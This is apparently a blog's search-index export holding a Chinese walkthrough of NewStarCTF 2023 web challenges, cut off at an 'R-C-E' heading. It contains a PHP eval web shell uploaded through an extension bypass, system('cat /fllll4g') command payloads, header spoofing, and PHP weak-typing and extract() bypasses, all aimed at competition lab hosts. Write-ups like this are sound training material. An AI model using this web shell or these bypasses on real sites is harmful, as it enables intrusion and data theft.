<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NewStarCTF 2023 公开赛道 WEB题目</title>
      <link href="/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/"/>
      <url>/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/</url>
      
        <content type="html"><![CDATA[<h2 id="NewStarCTF-2023-公开赛道-WEB"><a href="#NewStarCTF-2023-公开赛道-WEB" class="headerlink" title="NewStarCTF 2023 公开赛道 WEB"></a>NewStarCTF 2023 公开赛道 WEB</h2><h3 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h3><p><strong>考点：敏感文件泄漏</strong></p><p>通过盲猜 <a href="http://www.zip、index.php等常用隐藏名称可以猜出.或者使用/">www.zip、index.php等常用隐藏名称可以猜出。或者使用</a> dirsearch 进行搜索，可以查找到 <a href="http://www.zip文件：">www.zip文件：</a></p><p><img src="image-20231003102650464.png" alt="image-20231003102650464"></p><p>进行访问下载解压即可获得两个文件，将两个文件中的字段拼接起来就是flag：<code>flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</code></p><p><img src="image-20231003102104114.png" alt="image-20231003102104114"></p><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p><strong>考点：php文件上传漏洞</strong>，<a href="https://xz.aliyun.com/t/6957">一句话木马介绍</a></p><p>编写含有一句话木马的文件命名为1.php，内容为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"it is ok"</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击上传后会提示：</p><p><img src="image-20231003103302992.png" alt="image-20231003103302992"></p><p>改传1.php.png，随后通过 Burp 拦截将上传内容修改为 1.php，上传成功：</p><p><img src="image-20231003110326234.png" alt="image-20231003110326234"></p><p>再利用 中国蚁剑 工具进行链接：</p><pre class="line-numbers language-web-idl" data-language="web-idl"><code class="language-web-idl">http<span class="token operator">:</span><span class="token comment">//eade7cdc-4610-4431-8fad-84e6f86ba897.node4.buuoj.cn:81/upload/1.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20231003110436400.png" alt="image-20231003110436400"></p><p>直接在蚁剑中找到 flag 文件 fllll4g：</p><p><img src="image-20231003112917654.png" alt="image-20231003112917654"></p><p>或者 使用Hackbar，查看目录内容也可以得知含有 fllll4g 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">1</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20231003113042254.png" alt="image-20231003113042254"></p><p>再利用以下代码，得到flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">1</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'cat /fllll4g'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p><strong>考点：HTTP常见请求头、HTTP请求方式</strong></p><p>进入题目后，首先要求以GET方式给ctf参数传参数：</p><p><img src="image-20231004093250416.png" alt="image-20231004093250416"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//node4.buuoj.cn:29762/?ctf=1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后要求用POST方法传入 secret 参数，并且必须是正确的 secret：</p><p><img src="image-20231004094638065.png" alt="image-20231004094638065"></p><p>打开网页源代码可以找到 secret 提示：</p><p><img src="image-20231004094715815.png" alt="image-20231004094715815"></p><p>Base64解码后得到 secret 参数：</p><pre class="line-numbers language-none"><code class="language-none">n3wst4rCTF2023g00000d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 Hackbar 传入POST参数：</p><p><img src="image-20231004094931704.png" alt="image-20231004094931704"></p><p>下面更改 power 参数为 ctfer：</p><p><img src="image-20231004095011586.png" alt="image-20231004095011586"></p><p>再更改浏览器参数为 NewStarCTF2023：</p><p><img src="image-20231004095107075.png" alt="image-20231004095107075"></p><p>之后加入 Refer 参数，并修改为 newstarctf.com：</p><p><img src="image-20231004095225805.png" alt="image-20231004095225805"></p><p>加入 X-Real-IP 参数为 127.0.0.1，修改为本地用户访问：</p><p><img src="image-20231004095445708.png" alt="image-20231004095445708"></p><p>得到最终的 flag 值：<code>flag&#123;46df0dd3-dd02-4402-9e1e-08e555917442&#125;</code></p><p><strong>另：</strong></p><p>本题还可以使用 Burp 等工具进行修改参数，还可以使用 Python 进行求解：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> requests <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decodeurl <span class="token operator">=</span> <span class="token string">'http://node4.buuoj.cn:29762/'</span>params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'ctf'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'secret'</span><span class="token punctuation">:</span> b64decode<span class="token punctuation">(</span><span class="token string">'bjN3c3Q0ckNURjIwMjNnMDAwMDBk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'power'</span><span class="token punctuation">:</span> <span class="token string">'ctfer'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'NewStarCTF2023'</span><span class="token punctuation">,</span>    <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'newstarctf.com'</span><span class="token punctuation">,</span>    <span class="token string">'X-Real-IP'</span><span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">&#125;</span>s <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出为：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Begin of HTTP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">tppabs</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/style.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">body</span> <span class="token punctuation">&#123;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> #16a085<span class="token punctuation">;</span>            <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">canvas</span> <span class="token punctuation">&#123;</span>            <span class="token property">z-index</span><span class="token punctuation">:</span> -1<span class="token punctuation">;</span>            <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/jquery.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/verificationNumbers.js<span class="token punctuation">"</span></span> <span class="token attr-name">tppabs</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/verificationNumbers.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/Particleground.js<span class="token punctuation">"</span></span> <span class="token attr-name">tppabs</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/Particleground.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        <span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">particleground</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token literal-property property">dotColor</span><span class="token operator">:</span> <span class="token string">'#5cbdaa'</span><span class="token punctuation">,</span>                <span class="token literal-property property">lineColor</span><span class="token operator">:</span> <span class="token string">'#5cbdaa'</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ß    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin_login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>white<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>Welcome to NewStarCTF 2023~<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4px<span class="token punctuation">"</span></span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>white<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>恭喜你顺利完成了本道题目，这是你的Flag，快去提交吧：flag&#123;46df0dd3-dd02-4402-9e1e-08e555917442&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>&#123;&#125;&#123;'Connection': 'close', 'Content-Length': '666', 'Content-Encoding': 'gzip', 'Content-Type': 'text/html; charset=UTF-8', 'Date': 'Wed, 04 Oct 2023 01:58:05 GMT', 'Server': 'Apache/2.4.38 (Debian)', 'Vary': 'Accept-Encoding', 'X-Powered-By': 'PHP/7.3.15'&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p><strong>考点：Flask报错界面信息泄露</strong></p><p>题目如下所示：</p><p><img src="image-20231004100749405.png" alt="image-20231004100749405"></p><p>它说我们只用给出number1和number2，它会帮我们添加，于是：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//69dd29c8-0844-4ff3-aaef-ec632f65b4bc.node4.buuoj.cn:81/?number1=ab&amp;number2=2</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20231004101424500.png" alt="image-20231004101424500"></p><p>从中进行查找可以查看到flag：</p><p><img src="image-20231004101624946.png" alt="image-20231004101624946"></p><p><code>flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;</code></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p><strong>考点：PHP弱类型、PHP加密函数数组绕过、PHP函数特性、变量覆盖漏洞</strong></p><p><img src="image-20231004103006040.png" alt="image-20231004103006040"></p><p>本题一共分出了五个部分。</p><p>第一个部分：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 1=&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要考察PHP中md5弱类型比较的特点，只需要找到两个值不同但md5值以0e开头的字符串即可通过本关，原理是0e在进行弱类型比较时会被当作科学计数法进行比较，也就是0。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二个部分：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 2=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要考察PHP哈希函数的特性，在处理数组类型的传参时，md5、sha1等哈希函数会返回NULL值，由此可以构造出NULL&#x3D;&#x3D;&#x3D;NULL从而通过判断。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>：key3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三个部分：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 3=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$flag3</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要考察strcmp函数特性，如果传入的参数为数组类型，该函数就会返回NULL值，构造NULL&#x3D;&#x3D;0从而通过判断。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第四个部分：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 4=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2023</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$flag4</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要考察is_numeric函数特性，在传入的数字后加入任意字母或%00即可通过本层的判断。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024a</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第五个部分：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 5=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察extract函数导致的变量覆盖漏洞，这里的if判断只要保证传入变量flag5即可，根据上面的正则限制，变量值不能为字母和数字，那么可以传一个<code>![]</code>进去，[]空数组会隐式转换为false，在！取反得到我们要的true，(或者，传入一个任意符号也可通过本层。)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>key3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>flag5<span class="token operator">=</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag : <code>flag&#123;8b247b57-901a-48d6-91d3-8df4b50f3803&#125;</code></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" 